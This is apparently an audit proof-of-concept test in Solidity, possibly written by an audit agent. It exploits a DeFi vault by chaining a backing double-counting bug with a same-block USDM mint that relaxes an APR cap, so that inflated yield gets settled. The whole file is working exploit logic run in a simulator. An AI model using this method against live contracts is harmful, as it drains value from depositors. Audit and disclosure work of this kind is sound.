// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "test/simulator/SimulatorBase.sol";
import "../src/core/MonetrixAccountant.sol";
import "../src/core/MonetrixVault.sol";
import "../src/tokens/USDM.sol";

contract AuditAgentPoC is SimulatorBase {
    address attacker = address(0xdead);

    function setUp() public {
        setUpSimulator();
        vm.deal(attacker, 100 ether);
    }

    function test_exploit() public {
        // ATTACK TIMELINE:
        // 1. [Setup] SimulatorBase deploys the protocol. We fund the attacker with USDC.
        // 2. [T=1] Operator supplies spot tokens to BLP. Due to the double-counting bug in _readL1Backing(), 
        //          totalBackingSigned() artificially inflates the backing value and distributableSurplus().
        // 3. [T=2] Attacker deposits USDC to mint a massive amount of USDM in the same block. 
        //          This inflates the APR cap denominator in Gate 4 of settleDailyPnL, relaxing the yield cap.
        // 4. [T=3] Operator calls settle() with a proposedYield equal to the massively inflated surplus.
        //          Both the backing-ratio gate and APR-cap gate pass due to the compounded manipulations.
        // 5. [Assert] Verify that the declared yield is unreasonably large (greater than the actual spot supplied),
        //          proving that value was extracted far beyond what the protocol actually generated.

        // Step 1: Fund attacker with USDC
        uint256 depositAmount = 100_000_000_000; // 100,000 USDC (assuming 6 decimals)
        deal(address(usdc), attacker, depositAmount);

        // Step 2: Operator supplies spot tokens to trigger double-counting bug
        uint64 spotToken = 1; 
        uint64 spotAmount = 10_000_000_000; // 10,000 USDC equivalent

        vm.prank(operator);
        vault.supplyToBlp(spotToken, spotAmount);

        int256 inflatedSurplus = accountant.distributableSurplus();
        console.log("Step 2: Inflated distributable surplus =", inflatedSurplus);

        // Step 3: Attacker mints USDM in the same block to relax APR cap
        vm.startPrank(attacker);
        usdc.approve(address(vault), depositAmount);
        vault.deposit(depositAmount);
        vm.stopPrank();

        uint256 usdmSupply = usdm.totalSupply();
        console.log("Step 3: USDM total supply after mint =", usdmSupply);

        // Step 4: Operator settles with the inflated surplus
        uint256 proposedYield = uint256(inflatedSurplus);

        vm.prank(operator);
        vault.settle(proposedYield);

        uint256 totalSettled = accountant.totalSettledYield();
        console.log("Step 4: Total settled yield =", totalSettled);

        // Step 5: Assert the exploit
        // The settled yield should be unreasonably large, exceeding the actual spot amount supplied
        // because the double-counting bug artificially inflated the backing and surplus.
        assertGt(totalSettled, spotAmount, "Extracted yield exceeds actual spot supplied, proving double-counting exploit");
        assertGt(totalSettled, 0, "Yield was successfully settled bypassing APR cap");
    }
}
